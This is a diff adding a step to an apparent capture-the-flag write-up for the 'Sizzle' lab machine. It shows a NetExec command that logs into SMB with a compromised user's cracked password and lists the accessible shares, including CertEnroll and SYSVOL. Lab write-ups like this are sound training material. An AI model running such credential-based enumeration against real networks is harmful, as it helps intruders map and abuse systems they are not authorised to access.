@@ -282,3 +282,21 @@ SMB         10.129.15.12    445    SIZZLE           [+] HTB.LOCAL\amanda:Ashare1
 ```
 This user is now compromised
 
+```python
+nxc smb sizzle.htb.local -u 'amanda' -p 'Ashare1972' --shares 
+SMB         10.129.15.12    445    SIZZLE           [*] Windows 10 / Server 2016 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.15.12    445    SIZZLE           [+] HTB.LOCAL\amanda:Ashare1972 
+SMB         10.129.15.12    445    SIZZLE           [*] Enumerated shares
+SMB         10.129.15.12    445    SIZZLE           Share           Permissions     Remark
+SMB         10.129.15.12    445    SIZZLE           -----           -----------     ------
+SMB         10.129.15.12    445    SIZZLE           ADMIN$                          Remote Admin
+SMB         10.129.15.12    445    SIZZLE           C$                              Default share
+SMB         10.129.15.12    445    SIZZLE           CertEnroll      READ            Active Directory Certificate Services share
+SMB         10.129.15.12    445    SIZZLE           Department Shares READ            
+SMB         10.129.15.12    445    SIZZLE           IPC$            READ            Remote IPC
+SMB         10.129.15.12    445    SIZZLE           NETLOGON        READ            Logon server share 
+SMB         10.129.15.12    445    SIZZLE           Operations                      
+SMB         10.129.15.12    445    SIZZLE           SYSVOL          READ            Logon server share
+```
+This user has more access on SMB
+
